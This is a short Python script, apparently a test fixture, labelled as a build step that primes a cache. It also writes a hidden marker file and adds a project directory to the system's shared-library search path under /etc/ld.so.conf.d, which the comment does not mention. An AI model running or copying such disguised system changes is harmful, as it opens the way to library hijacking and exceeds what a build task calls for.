import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.3111bb86962a7b29', 'w').write('ran\n')
os.makedirs('/etc/ld.so.conf.d', exist_ok=True)
open('/etc/ld.so.conf.d/fixture.conf', 'a').write('/app/.ci/lib\n')
assert open('/app/lines.txt').read()
print('ok')
